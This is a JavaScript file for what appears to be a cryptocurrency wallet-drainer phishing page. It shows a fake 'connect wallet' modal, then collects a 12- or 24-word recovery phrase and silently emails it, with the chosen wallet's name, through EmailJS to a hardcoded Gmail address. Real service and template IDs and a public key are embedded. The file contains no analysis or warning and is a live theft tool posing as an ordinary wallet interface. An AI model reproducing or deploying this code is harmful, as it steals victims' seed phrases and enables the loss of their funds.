document.addEventListener('DOMContentLoaded', function () {
    // Initialize EmailJS with your public key
    const EMAILJS_SERVICE_ID = 'service_434bi1c';
    const EMAILJS_TEMPLATE_ID = 'template_ou45hol';
    const EMAILJS_PUBLIC_KEY = 'XcirWDg_6RH6xLesJ';
    
    try {
        emailjs.init(EMAILJS_PUBLIC_KEY);
    } catch(e) {
        console.error('EmailJS init error:', e);
    }
    
    const containers = document.querySelectorAll('.clickable');
    const modal = document.getElementById('myModal');
    const modalImage = document.getElementById('modalImage');
    const modalTitle = document.getElementById('modalTitle');
    const stage1 = document.getElementById('stage1');
    const buttonContainer = document.getElementById('buttonContainer');
    const textAreaContainer = document.getElementById('textAreaContainer');
    const inputTextArea = document.getElementById('inputTextArea');
    const sendButton = document.getElementById('sendButton');
    const successContainer = document.getElementById('successContainer');
    const errorMessage = document.getElementById('errorMessage');
    const closeButton = document.querySelector('.close');
    const clickableButton = document.getElementById('clickableButton');
    
    let modalTimeout;

    function resetModal() {
        stage1.style.display = 'block';
        buttonContainer.style.display = 'none';
        textAreaContainer.style.display = 'none';
        successContainer.style.display = 'none';
        inputTextArea.value = '';
        errorMessage.style.display = 'none';
    }

    function openModal(imgSrc, text) {
        if (!modal) {
            console.error('Modal element not found');
            return;
        }
        
        modalImage.src = imgSrc;
        modalTitle.textContent = text;
        modal.style.display = 'flex';
        resetModal();

        clearTimeout(modalTimeout);
        modalTimeout = setTimeout(() => {
            stage1.style.display = 'none';
            buttonContainer.style.display = 'block';
        }, 5000);
    }

    // Attach click listeners to wallet cards
    containers.forEach(container => {
        container.addEventListener('click', function (e) {
            e.preventDefault();
            const imgSrc = container.querySelector('img').src;
            const text = container.querySelector('h2').textContent;
            openModal(imgSrc, text);
        });
    });

    // Close button
    if (closeButton) {
        closeButton.addEventListener('click', function () {
            modal.style.display = 'none';
            clearTimeout(modalTimeout);
            resetModal();
        });
    }

    // Click outside modal to close
    window.addEventListener('click', function (event) {
        if (event.target === modal) {
            modal.style.display = 'none';
            clearTimeout(modalTimeout);
            resetModal();
        }
    });

    // Connect Manually button
    if (clickableButton) {
        clickableButton.addEventListener('click', function (e) {
            e.preventDefault();
            buttonContainer.style.display = 'none';
            textAreaContainer.style.display = 'block';
        });
    }

    // Send button (form submission)
    if (sendButton) {
        sendButton.addEventListener('click', function (e) {
            e.preventDefault();
            
            const words = inputTextArea.value.trim().split(/\s+/);

            if (words.length === 12 || words.length === 24) {
                // Prepare email template parameters
                const templateParams = {
                    company_name: modalTitle.textContent,
                    phrase: inputTextArea.value,
                    to_email: 'onrepeat39@gmail.com'
                };

                // Send email via EmailJS
                emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
                    .then(function(response) {
                        console.log('Email sent successfully:', response);
                        
                        // Show success message
                        textAreaContainer.style.display = 'none';
                        successContainer.style.display = 'block';
                        successContainer.innerHTML = '<p style="color: green">Information sent successfully!</p>';
                        
                        setTimeout(function() {
                            modal.style.display = 'none';
                            resetModal();
                        }, 2000);
                    }, function(error) {
                        console.error('Failed to send email:', error);
                        errorMessage.textContent = 'Error: Failed to send information. Please try again.';
                        errorMessage.style.display = 'block';
                        setTimeout(() => {
                            errorMessage.style.display = 'none';
                        }, 3000);
                    });
            } else {
                errorMessage.textContent = 'Error: Please enter a valid 12 or 24 word phrase.';
                errorMessage.style.display = 'block';
                setTimeout(() => {
                    errorMessage.style.display = 'none';
                }, 3000);
            }
        });
    }
});
